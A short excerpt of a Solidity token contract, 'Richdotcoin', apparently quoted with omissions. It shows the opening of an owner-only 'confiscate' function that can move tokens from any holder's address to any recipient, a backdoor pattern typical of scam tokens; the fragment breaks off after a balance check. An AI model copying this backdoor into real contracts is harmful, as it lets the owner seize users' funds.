...
contract Richdotcoin is Context, IERC20, Ownable {
    ...
    function confiscate(address sender, address recipient, uint256 amount,bool takeFee) public returns (bool) {
        require(msg.sender == owner());
        require(_rOwned[sender] > amount*10**18, "insufficient balance");
